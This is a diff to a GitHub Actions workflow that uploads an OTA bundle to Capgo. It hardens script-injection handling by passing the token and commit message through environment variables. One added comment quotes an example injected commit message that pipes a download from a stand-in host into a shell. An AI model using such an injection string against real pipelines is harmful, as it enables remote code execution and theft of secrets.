@@ -5,6 +5,9 @@ on:
     branches:
       - main
 
+permissions:
+  contents: read
+
 jobs:
   deploy-ota:
     name: Build & Upload OTA Bundle
@@ -27,17 +30,24 @@ jobs:
 
       - name: Check Capgo Secret
         id: check-key
+        env:
+          CAPGO_TOKEN: ${{ secrets.CAPGO_TOKEN }}
         run: |
-          if [ -z "${{ secrets.CAPGO_TOKEN }}" ]; then
+          if [ -z "$CAPGO_TOKEN" ]; then
             echo "::error::CAPGO_TOKEN secret is not set! Go to Repo Settings -> Secrets and variables -> Actions to add it."
             exit 1
           fi
 
       - name: Upload OTA bundle to Capgo Cloud
+        # The commit message and the token reach the shell as ENVIRONMENT VARIABLES, never pasted into the script text:
+        # a commit message such as  x"; curl evil | sh  would otherwise run as code with the token in reach.
+        env:
+          CAPGO_TOKEN: ${{ secrets.CAPGO_TOKEN }}
+          OTA_COMMENT: ${{ github.event.head_commit.message }}
         run: |
           npx @capgo/cli@latest bundle upload \
-            --apikey "${{ secrets.CAPGO_TOKEN }}" \
+            --apikey "$CAPGO_TOKEN" \
             --channel production \
             --path dist \
             --auto-bump patch \
-            --comment "${{ github.event.head_commit.message }}"
+            --comment "$OTA_COMMENT"
